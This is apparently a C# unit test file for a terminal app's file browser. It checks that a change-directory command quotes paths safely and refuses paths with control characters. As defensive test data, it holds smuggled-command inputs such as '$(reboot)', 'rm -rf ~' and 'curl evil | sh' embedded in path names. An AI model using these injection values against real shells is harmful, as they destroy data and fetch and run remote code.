using Mokaterm.UI.FileBrowser.Browsing;

namespace Mokaterm.UI.FileBrowser.Tests;

public sealed class PosixShellTests
{
	[Theory]
	[InlineData("/srv/site", "cd -- '/srv/site'\r")]
	[InlineData("/srv/my site", "cd -- '/srv/my site'\r")]
	[InlineData("/home/abc/it's here", "cd -- '/home/abc/it'\\''s here'\r")]
	[InlineData("/tmp/$(reboot)`id`;ls", "cd -- '/tmp/$(reboot)`id`;ls'\r")]
	[InlineData("/srv/caf\u00e9", "cd -- '/srv/caf\u00e9'\r")]
	public void ChangeDirectoryCommand_QuotesThePath(string directory, string expected) =>
		Assert.Equal(expected, PosixShell.ChangeDirectoryCommand(directory));

	// The command is typed into a live shell, so these would act as keys: Ctrl+C or Ctrl+U drop the "cd" typed so far and
	// the rest of the name runs as a command of its own.
	[Theory]
	[InlineData("/tmp/x\u0003rm -rf ~\r")]
	[InlineData("/tmp/x\u0015curl evil | sh\r")]
	[InlineData("/tmp/x\u001b[201~")]
	[InlineData("/tmp/two\nlines")]
	[InlineData("/tmp/x\u007f")]
	[InlineData("/tmp/x\u009b")]
	public void ChangeDirectoryCommand_PathWithControlCharacters_IsRefused(string directory) =>
		Assert.Null(PosixShell.ChangeDirectoryCommand(directory));
}
